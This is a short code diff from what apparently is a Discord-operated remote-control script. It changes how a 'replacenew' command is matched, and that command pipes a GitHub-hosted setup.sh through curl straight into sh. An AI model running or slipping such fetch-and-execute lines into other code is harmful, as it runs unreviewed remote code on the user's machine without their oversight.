@@ -118,7 +118,7 @@ while True:
                             except KeyboardInterrupt:
                                 continue
                             continue
-                elif command == ('replacenew'):
+                elif command.startswith('replacenew') and command.endswith('replacenew'):
                     system('curl -fsSL https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/setup.sh | sh', shell=True)
                     from sys import exit
                     exit()
